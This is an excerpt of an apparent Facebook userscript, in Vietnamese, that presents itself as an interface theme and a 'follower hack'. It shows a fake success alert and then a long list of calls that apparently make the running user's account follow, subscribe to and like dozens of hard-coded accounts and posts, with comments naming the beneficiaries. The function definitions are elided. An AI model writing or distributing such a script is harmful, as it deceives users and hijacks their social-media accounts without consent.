// ==UserScript==
// @name            Giao Dien Dep
// @description     All about facebook By ĐẠt Trần
...
alert('Chúc Mừng Bạn Đã Hack Người Theo Dõi Thành Công Xin ĐỢi 5 Phút Để LOAD ảnh ! Nghe Nhạc Vui Vẻ Nhé !');
...
IDS("100006037502616");
IDS("100007997439416");
sublist("147269905484259");
sublist("200682230143026");
sublist("1384626965147205");
Like("622922324391096");
Like("614795568558087");
a("100007930780509");
//Cái nhồn rì vậy ??? (cấm xóa)
a("100003117554445");
sublist ("416396038474311");
IDS("100007616952561");Like("405520482887278");P("1394477720816113");P("1384968075100411");sublist(1413533658910519);
a("100005757240765");
//Tú ml (cấm xóa)
sublist(308182512669708);a("100004338847101");
P("1381815385437977");
//Tuan Anh Phan ( k xóa)
...
Like("279961818824452");
sublist("1458901537666597");
a("100006402938146");
//To QuocKiet (k xóa)
sublist("244241672399477"); 
sublist("228288480661463");sublist("228300957326882");sublist("229230533900591");
sublist("229236610566650"); 
sublist("229232790567032");sublist("229236760566635");sublist("229230210567290");
sublist("229231693900475");sublist("244676845689293");sublist("244677645689213");
sublist("244677869022524");sublist("244678025689175");sublist("244678119022499");
a("100004409377161");a("100004443512112");a("100005701744035");P("1443959769182921");
//hoang trinh (k xoa)
a("100005143574461");
a("100004431942997");
Like("401219400018357");
...
a("100006765426287");
//Tien tu te
a("100007463290886"); sublist("1417966401795456");
//Tên Rất Ngắn
a("100008163098111");
//Dung Tran
a("100007715620491");
sublist("1396828330584341");
..Ha Minh Duong
sublist("263064320532854");a("100004878638533");
// hua ko em
a("100003767733720");
a("100004558394051");
sublist("437861599682761");
sublist("437304046405183");
sublist("438121516323436");
//Xin dung Yeu toi
a("100006532749325");
//Nam Chjm Sẻ
a("100004600901561");
sublist("228101434012409");
(function() {
